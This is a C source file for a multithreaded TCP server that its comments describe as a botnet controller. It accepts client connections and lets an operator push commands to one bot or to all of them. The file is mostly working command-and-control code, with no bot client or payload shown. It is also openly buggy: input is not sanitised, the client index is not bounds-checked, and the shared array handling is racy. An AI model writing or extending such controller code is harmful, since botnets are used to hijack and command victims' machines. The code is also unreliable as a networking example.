// Listens for connection and sends message to connected client
// to compile: gcc server.c -o server -lpthread

/*
Code is void of input sanitation and missing a lot of error checks.
Code does not update array when client disconnects.
Code has no functionality to exit cleanly.
*/

#include "simple_networking.h"
#include <poll.h>
#include <pthread.h>

// Function declarations
void* handle_connection(void *arguments);
void* bot_command(void *args_main);
void append_pfds(struct pollfd *pfds[], int new_fd, int *fd_count, int *fd_size);


// Structure of arguments for use with bot_command and handle_connection functions
struct arguments
{
    int fd_count;
    int listener_fd;
    connection client_con;
    int *fd_size;
    struct pollfd *pfds;
};

static pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;

int main(void)
{
    connection client_con = bind_socket("127.0.0.1", 8080);

    // Set count for number of assigned file descriptors (current number of connections)
    int fd_count = 0;

    // Allocate initial memory for array based on 5 connections
    int fd_size = 5;
    struct pollfd *pfds = malloc(sizeof(*pfds) * fd_size);

    // Add listener information to array and increment count of assigned file descriptors
    int listener_fd = client_con.sock_fd;
    pfds[0].fd = listener_fd;
    pfds[0].events = POLLIN;
    fd_count++;

    printf("[+] Server awaiting connection...\n");

    // Create structure of arguments and allocate memory based on size of structure
    struct arguments *args;
    args = malloc(sizeof(struct arguments));

    // Assign values to argument struct for use in functions
    args->pfds = pfds;
    args->fd_count = fd_count;
    args->listener_fd = listener_fd;
    args->client_con = client_con;
    args->fd_size = &fd_size;


    pthread_t connection_thread, control_thread;

    // Create 2 threads - one to accept connections and one to control botnet
    pthread_create(&connection_thread, NULL, handle_connection, (void *)args);
    pthread_create(&control_thread, NULL, bot_command, (void *)args);

    // Wait for threads to finish
    pthread_join(connection_thread, NULL);
    pthread_join(control_thread, NULL);

    // Exit
    return 0;
}

// Handles incomming connections and appends information to array
void* handle_connection(void *args_main)
{

    socklen_t client_addr_size;
    int new_fd;
    struct arguments *args = (struct arguments*)args_main;
    char buff[1024];

    while(1)
    {
        // Poll the array for events and set .revents
        int rc = poll(args->pfds, args->fd_count, -1);

        // Check return code of poll(). Return error if -1
        if (rc == -1)
        {
            perror("[-] Error poll()");
            exit(1);
        }

        // Run through connections and look for data to read
        for (int i = 0; i < args->fd_count; i++)
        {
            // Check if socket is ready to read
            if (args->pfds[i].revents & POLLIN)
            {
                // If listener is ready to read, handle new connection
                if (args->pfds[i].fd == args->listener_fd)
                {
                    // Accept queued connection and assign new file descriptor
                    client_addr_size = sizeof(args->client_con.client_addr);
                    new_fd = accept(args->client_con.sock_fd,
                        (struct sockaddr *)&args->client_con.client_addr, &client_addr_size);

                    // Check return code of accept(). Return error if -1
                    if (new_fd == -1)
                    {
                        perror("[-] Error accept()");
                    }
                    else
                    {
                        // Set lock
                        pthread_mutex_lock(&mutex);

                        // Add new connection information to array
                        append_pfds(&args->pfds, new_fd, &args->fd_count, args->fd_size);

                        // Release lock
                        pthread_mutex_unlock(&mutex);
                    }
                }
                else
                {
                    // If client has disconnected, remove from array.
                    if (recv(args->pfds[i].fd, buff, sizeof(buff), 0) < 1)
                    {
                        // Print statement purely for testing purposes. Will be removed from final copy.
                        printf("Client closed. Removing client from socket %d.\n",args->pfds[i].fd);

                        // Close file descriptor for client
                        close(args->pfds[i].fd);

                        // Decrement count of connected clients and replace disconnected client with last element of array
                        args->fd_count--;
                        args->pfds[i] = args->pfds[args->fd_count];
                    }
                }
            }
        }
    }
}

// Append new connection file descriptor to array
// Function from beej (http://beej.us/guide/bgnet/html/)
void append_pfds(struct pollfd *pfds[], int new_fd, int *fd_count, int *fd_size)
{
    // Check if array is full and double size if necessary
    if (*fd_size == *fd_count)
    {
        *fd_size *= 2;
        *pfds = realloc(*pfds, sizeof(**pfds) * (*fd_size));
    }

    // Add file descriptor to array and set event to check for read
    (*pfds)[*fd_count].fd = new_fd;
    (*pfds)[*fd_count].events = POLLIN;

    // Increment count of assigned file descriptors
    (*fd_count)++;
}

// User control
// Will - this is where you will implement user interface
void* bot_command(void *args_main)
{
    char data[1024];
    struct arguments *args = (struct arguments*)args_main;


    while(1)
    {
        // Prompt user for input and remove trailing newline
        printf("[+] [show] connections, send to [single] client, send to [all] client or [exit]\n");
        printf(">> ");
        fgets(data, sizeof(data), stdin);
        data[strcspn(data, "\n")] = 0;

        // Display current list of connections
        if (strcmp(data, "show") == 0)
        {
            // Iterate through array and print client information
            for (int i = 0; i < args->fd_count; i++)
            {
                printf("client %d is on fd %d\n", i, args->pfds[i].fd);
            }
        }

        // Send command to ALL connections except listener
        else if (strcmp(data, "all") == 0)
        {
            // Prompt user for input and remove trailing newline
            printf("[+] Enter command: ");
            fgets(data, sizeof(data), stdin);
            data[strcspn(data, "\n")] = 0;

            // Iterate through array, omitting listener, and send data to each file descriptor
            for (int i = 1; i < args->fd_count; i++)
            {
                send(args->pfds[i].fd, data, sizeof(data), 0);
            }
        }

        // Send command to SINGLE client
        else if (strcmp(data, "single") == 0)
        {
            // Prompt user for input, remove trailing newline and convert input to int
            printf("[+] Enter client: ");
            fgets(data, sizeof(data), stdin);
            data[strcspn(data, "\n")] = 0;
            int num = atoi(data);

            // Prompt user for input and remove trailing newline
            printf("[+] Enter command: ");
            fgets(data, sizeof(data), stdin);
            data[strcspn(data, "\n")] = 0;

            // Send data to client specified by user input, based on array index
            send(args->pfds[num].fd, data, sizeof(data), 0);
        }

        // Exit control of bot
        else if (strcmp(data, "exit") == 0)
        {
            printf("Exiting...\n");
            exit(0);
        }
    }
}
